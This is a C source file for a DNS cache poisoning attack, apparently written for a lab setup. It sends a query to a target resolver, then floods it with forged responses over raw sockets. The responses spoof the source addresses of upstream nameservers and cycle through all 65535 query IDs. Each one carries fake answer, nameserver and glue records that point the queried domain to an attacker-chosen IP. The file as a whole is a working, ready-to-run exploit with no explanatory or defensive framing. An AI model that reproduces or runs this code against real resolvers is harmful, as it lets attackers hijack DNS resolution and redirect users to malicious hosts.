// DNS Cache Poisoning Attacking
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>

#ifndef u8
#define u8  unsigned char
#endif

#ifndef u16
#define u16 unsigned short
#endif

#ifndef u32
#define u32 unsigned long
#endif



struct DNS_header {
	unsigned short QID;
	unsigned short opt;
	unsigned short Questions;
	unsigned short Answer_RRS;
	unsigned short Authority_RRS;
	unsigned short Additional_RRS;
};

struct Quset {

	unsigned short Type;
	unsigned short Class;
};

struct RR {
	unsigned short TTL[2];
	unsigned short Rdata_len;
};

struct ip_header {
	u8  ihl:4,
	    version:4;
	u8  tos;
	u16 tot_len;
	u16 id;
	u16 frag_off;
	u8  ttl;
	u8  protocol;
	u16 check;
	u32 saddr;
	u32 daddr;
};

struct udp_header {
	u16 source;
	u16 dest;
	u16 len;
	u16 check;
};

struct udp_packet {
	struct ip_header iph;
	struct udp_header udph;
};



void kill_sock( int sig );
void sig_child( int signo );

unsigned short csum(unsigned short *addr, int len);

struct in_addr *atoaddr(char *address);
int cpy_url( unsigned char* url_ptr , unsigned char* buffer );
unsigned int add_dns_header( unsigned char* h_ptr , unsigned short opt , 
		unsigned short que , unsigned short ans , unsigned short aut , unsigned short add );
unsigned int add_que_header( unsigned char* h_ptr , unsigned char *url , unsigned short type );
unsigned int add_ans_header( unsigned char* h_ptr , unsigned short data_len );
unsigned int add_aut_header( unsigned char* h_ptr , unsigned short data_len );
unsigned int add_add_header( unsigned char* h_ptr , unsigned short data_len , unsigned char *data );
unsigned int add_edns0_header(unsigned char* h_ptr);

unsigned char   buffer[1024];
unsigned char	attack[1024];

int     sock , sock_attack;

int main ( int argc , char *argv[] )
{
	pid_t child_pid;
	int     port , server_len , olen;
	struct  sockaddr_in server_addr , clinet_addr;
	struct  in_addr *addr;
	struct 	DNS_header *dns_h;
	struct	Quset *qname;
	struct  RR *rr;
	struct	ip_header *iph;
	struct  udp_header *udph;
	struct  udp_packet *packet , *packet2 , *packet3;

	int 	do_flag , send_len;
	unsigned short i , j ;
	int ret , url_len;
	unsigned char   base_reg;
	unsigned char	target_url[256];
	unsigned char	name[256];
	unsigned char	NS_name[3][16] = { "STRAWB" , "BITSY" , "W20NS" };  //{ "DNS1" , "DNS2" , "DNS3" }; //{ "STRAWB" , "BITSY" , "W20NS" };
	unsigned char	IP[4];
	unsigned long   ip , fack_dns_ip;
	unsigned char	*q , *ans , *aut , *add;
	int 	que_l , ans_l , aut_l , add_l , dns_l;
	int 	que_a , ans_a , aut_a , add_a , att_l;

	ip = inet_addr("140.114.77.3");
	memcpy ( IP , &ip , 4 );
	if( argc < 2 )
	{
		fprintf(stderr , "input error\n");
		return 1;
	}
	// init target url array
	for( i = 0 ; i < 256 ; i++ )
		target_url[i] = '\0';
	strncpy( target_url , argv[1] , strlen(argv[1]) );
	
/*	for ( i = 0 ; i < 3 ; i++ )
	{
		printf( "%d %s\n", strlen( NS_name[i] ) , NS_name[i] );
	}*/
	port = 53;

	// start up query socket 
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr("192.168.58.128");//addr->s_addr;
	bzero(&(server_addr.sin_zero),8);
	clinet_addr.sin_family = AF_INET;
	clinet_addr.sin_port = htons(port);
	clinet_addr.sin_addr.s_addr = INADDR_ANY;
	bzero(&(clinet_addr.sin_zero),8);
	if ( (sock = socket(AF_INET, SOCK_DGRAM , 0)) == -1 )
	{
		perror("Unable to create Socket");
		return 1;
	}

	if (bind( sock , (struct sockaddr *)&clinet_addr, sizeof(struct sockaddr)) == -1) {
		perror("Unable to bind");
		exit(1);
	}
	// init attack raw socket
	if ( (sock_attack = socket(AF_INET, SOCK_RAW , IPPROTO_UDP )) == -1 )
	{
		perror("Unable to create Socket");
		return 1;
	}
	olen = 1;
	if ( setsockopt(sock_attack , IPPROTO_IP, IP_HDRINCL, &olen, sizeof(olen)) == -1 )
		perror("ERROR: could not set socket option IP_HDRINCL.");

	server_len = sizeof( struct sockaddr_in );
	// create qeuestion dns query
	dns_l = add_dns_header( buffer , 0x0100 , 1 , 0 , 0 , 0 );
	que_l = add_que_header( buffer + dns_l , target_url , 0x01 );

	// create attack dns query
	att_l = add_dns_header( attack , 0x8400 , 1 , 1 , 3 , 4 );
	// question
	q = attack + att_l;
	que_l = add_que_header( q , target_url , 0x01 );
	
	// answer
	ans_l = 0;
	ans = q + que_l;
	
	*(ans) 	   = 0xc0;
	*(ans + 1) = q - attack;
	ans_l = add_ans_header( ans + 2 , 4 ) + 2;
	fack_dns_ip = inet_addr("140.114.63.1");
	strncpy( ans+ans_l , (unsigned char*)&fack_dns_ip , 4 );
	ans_l += 4;
	
	

	// authoritative
	aut = ans + ans_l;
	for ( i = 0 , aut_l = 0 ; i < 3 ; i++ )
	{
		*(aut + aut_l    ) = 0xc0;
		*(aut + aut_l + 1) = att_l + q[0] + 1;
		aut_l += add_aut_header( aut + aut_l + 2 ,  3 + strlen(NS_name[i]) ) + 2;
		*(aut + aut_l    ) = (unsigned char) strlen(NS_name[i]);
		memcpy( (aut+aut_l+1) , (unsigned char*) NS_name[i] , strlen(NS_name[i]) );
		*(aut + aut_l + 1 + strlen(NS_name[i]) ) = 0xc0;
		*(aut + aut_l + 2 + strlen(NS_name[i]) ) = aut[1];
		aut_l += 3 + strlen(NS_name[i]) ;

	}
	

	// additional
	add = aut + aut_l;
	add_l = 0;
	base_reg = aut - attack + 2 + sizeof(struct Quset) + sizeof(struct RR); // NS record offset address
	add[0] = 0xc0;
	add[1] = base_reg;
	fack_dns_ip = inet_addr("140.114.63.1");
	add_l = add_add_header( add+2 , 4 , (unsigned char*)&fack_dns_ip ) + 2;
	*(add + add_l    ) = 0xc0;
	base_reg += 2 + sizeof(struct Quset) + sizeof(struct RR) + strlen(NS_name[0]) + 3;
	*(add + add_l + 1) = base_reg;
	add_l += add_add_header( add+add_l+2 , 4 , (unsigned char*)&fack_dns_ip ) + 2;
	*(add + add_l    ) = 0xc0;
	base_reg += 2 + sizeof(struct Quset) + sizeof(struct RR) + strlen(NS_name[1]) + 3;
        *(add + add_l + 1) = base_reg;
	add_l += add_add_header( add+add_l+2 , 4 , (unsigned char*)&fack_dns_ip ) + 2;
	add_l += add_edns0_header( add+add_l );


	send_len = att_l + que_l + ans_l + aut_l + add_l;

	// create raw socket packet
	packet = calloc( 1 , sizeof(struct udp_packet) + send_len );
	packet2 = calloc( 1 , sizeof(struct udp_packet) + send_len );
	packet3 = calloc( 1 , sizeof(struct udp_packet) + send_len );
	iph = &packet->iph;
	udph = &packet->udph;;
	iph->ihl       = 5;	// IP header
	iph->version   = 4;
	iph->tos       = 0;
	iph->tot_len   = sizeof(struct udp_packet) + send_len;
	iph->id        = htonl(0xbeef);
	iph->frag_off  = 0;
	iph->ttl       = 255;
	iph->protocol  = 17;
	udph->len      = htons(sizeof(struct udp_header) + send_len);
	iph->saddr      = inet_addr("18.72.0.3");
	iph->daddr      = inet_addr("192.168.58.128");
	iph->check      = csum((unsigned short *)iph, sizeof(struct ip_header));
	udph->check  = 0;	// UDP header
	udph->source = htons(53);
	udph->dest   = htons(53);
	memcpy( (unsigned char*)&packet[1] , attack , send_len);
	memcpy( (unsigned char*)packet2 , (unsigned char*)packet , send_len + sizeof(struct udp_packet) );
	memcpy( (unsigned char*)packet3 , (unsigned char*)packet , send_len + sizeof(struct udp_packet) );
	//iph = &packet2->iph;
	(&packet2->iph)->saddr      = inet_addr("18.71.0.151");
	//iph = &packet3->iph;
	(&packet3->iph)->saddr      = inet_addr("18.70.0.160");	
	dns_h = (struct DNS_header *)&packet[1];


	signal (SIGCHLD, sig_child);
	if ( ( child_pid = fork() ) == 0 ) // child processs
	{
		//send_len = sizeof(struct DNS_header) + que_l + ans_l + aut_l + add_l;
		// send question package
		sendto( sock , buffer , dns_l + que_l , 0 , (struct sockaddr*)&server_addr , server_len  );
		// start hacking
		//i = 0;


		for( i = 0 ; i < 65535 ; i++ )
		{
			dns_h = (struct DNS_header *)&packet[1];
			dns_h->QID = htons(i);
			sendto( sock_attack , packet , sizeof(struct udp_packet) + send_len ,  0 , (struct sockaddr*)&server_addr , server_len );
			dns_h = (struct DNS_header *)&packet2[1];
			dns_h->QID = htons(i);
			sendto( sock_attack , packet2 , sizeof(struct udp_packet) + send_len ,  0 , (struct sockaddr*)&server_addr , server_len );

			dns_h = (struct DNS_header *)&packet3[1];
			dns_h->QID = htons(i);	
			sendto( sock_attack , packet3 , sizeof(struct udp_packet) + send_len ,  0 , (struct sockaddr*)&server_addr , server_len );
			//usleep(1);
		}

	}
	else // parent process
	{
		ret = recvfrom( sock , buffer , 1024 , 0 , (struct sockaddr*)&server_addr , &server_len);
		//printf("%d\n",ret);
		dns_h = (struct DNS_header*) buffer;
		if( ntohs(dns_h->Answer_RRS) > 0 )
		{
			q = (unsigned char*)&dns_h[1];
			//printf("question: %s\n",q);
			qname = (struct Quset*)&q[strlen(q)+1];
			ans = (unsigned char*)&qname[1];
			if( ans[0] == 0xc0 )
			{
				printf("answer: %s\n",(buffer+ans[1]));
				qname = (struct Quset*)&ans[2];
				rr = (struct RR*)&qname[1];
				ans = (unsigned char*)&rr[1];
				printf("IP: ");
				for( i = 0 ; i < 4 ; i++ )
					printf("%d.",ans[i]);
				printf("\n");

			}

		}
		else if( dns_h->opt == htons(0x8183) )
		{
			printf("No such name\n");
		}
		else 
		{
			printf("hit\n");
		}
		signal (SIGTERM, kill_sock);
		kill( child_pid , SIGTERM);
	}
	return 0;
}

unsigned int add_dns_header( unsigned char* h_ptr , unsigned short opt , 
		unsigned short que , unsigned short ans , unsigned short aut , unsigned short add )
{
	struct 	DNS_header *dns_ptr;
	int	len;

	dns_ptr = (struct DNS_header*)h_ptr;

	dns_ptr->QID = htons(0x5000);
	dns_ptr->opt = htons(opt);
	dns_ptr->Questions = htons(que);
	dns_ptr->Answer_RRS = htons(ans);
	dns_ptr->Authority_RRS = htons(aut);
	dns_ptr->Additional_RRS = htons(add);

	len = sizeof( struct DNS_header );
	return len;
}

unsigned int add_que_header( unsigned char* h_ptr , unsigned char *url , unsigned short type  )
{
	struct Quset *query;
	int len;
	//printf("%s",url);
	len = cpy_url( url , h_ptr );
	//printf("%d\n",len);
	query =(struct Quset*) (h_ptr+len);
	query->Type = htons(type);
	query->Class = htons(0x01);
	len += sizeof( struct Quset );
	return len;
}

unsigned int add_ans_header( unsigned char* h_ptr , unsigned short data_len )
{
	struct Quset *query;
	struct RR *rr;
	int len;

	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x01);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	len = sizeof(struct Quset) + sizeof(struct RR);

	return len;
}

unsigned int add_aut_header( unsigned char* h_ptr , unsigned short data_len  )
{
	struct Quset *query;
	struct RR *rr;
	int len;

	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x02);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	len = sizeof(struct Quset) + sizeof(struct RR);

	return len;
}

unsigned int add_add_header( unsigned char* h_ptr , unsigned short data_len , unsigned char *data )
{
	struct Quset *query;
	struct RR *rr;
	unsigned char *p;
	int len;
	query = ( struct Quset *)h_ptr;
	query->Type = htons(0x01);
	query->Class = htons(0x01);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0002);
	rr->TTL[1] = htons(0xa300);
	rr->Rdata_len = htons(data_len);
	p = (unsigned char*)&rr[1];
	strncpy( p , data , data_len);
	// edns0 opt
	/*
	p = p + data_len;
	p[0] = 0;
	query = ( struct Quset *)&p[1];
	query->Type = htons(0x29);
	query->Class = htons(0x1000);
	rr = (struct RR*)&query[1];
	rr->TTL[0] = htons(0x0000);
	rr->TTL[1] = htons(0x8000);
	rr->Rdata_len = 0;*/
	len = sizeof(struct Quset) + sizeof(struct RR) + data_len;

	return len;
}
unsigned int add_edns0_header(unsigned char* h_ptr)
{
	struct Quset *query;
        struct RR *rr;
        unsigned char *p;
        int len;
	p = h_ptr;
	p[0] = 0;
        query = ( struct Quset *)&p[1];
        query->Type = htons(0x29);
        query->Class = htons(0x1000);
        rr = (struct RR*)&query[1];
        rr->TTL[0] = htons(0x0000);
        rr->TTL[1] = htons(0x8000);
        rr->Rdata_len = 0;
	len = 1 + sizeof(struct Quset) + sizeof(struct RR);

	return len;
}
struct in_addr *atoaddr(char *address)
{
	struct hostent *host;
	static struct in_addr saddr;

	/* First try it as aaa.bbb.ccc.ddd. */
	saddr.s_addr = inet_addr(address);
	if (saddr.s_addr != -1) {
		return &saddr;
	}
	host = gethostbyname(address);
	if (host) {
		return (struct in_addr *) *host->h_addr_list;
	}
	return NULL;
}

int cpy_url( unsigned char* url_ptr , unsigned char* buffer )
{
	//unsigned char buffer[256];
	unsigned char counter; //8 bit
	unsigned char *tmp_ptr;
	int url_len = 0;

	while ( *url_ptr != '\0' )
	{	
		counter = 0x0;
		tmp_ptr = url_ptr;
		while ( *url_ptr != '.' && *url_ptr != '\0')
		{
			counter++;
			url_ptr++;
		}
		*url_ptr = '\0';
		buffer[(int)url_len++] = counter;
		strncpy( (buffer+(int)url_len) , tmp_ptr , counter );
		url_len += (int) counter;
		url_ptr++;
		tmp_ptr = url_ptr;
		//printf("%s , %d , %d\n",tmp_ptr , (int)counter , url_len);
		//printf(" %s\n",buffer);
	}
	buffer[(int)url_len++] = 0x0;
	return url_len;
}

void    kill_sock( int sig )
{
	pid_t   pid;
	int     stat;
	kill( 0, SIGTERM );

	close( sock );
	exit(0);
}

void sig_child( int signo )
{
	pid_t   pid;
	int     stat;

	while( (pid = waitpid(-1,&stat,WNOHANG)) > 0 )
	{
		//fprintf(stderr,"child %d terminated\n",pid);
	}
	return;
}


unsigned short csum(unsigned short *addr, int len) {
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer); /* return the checksum value. */
}
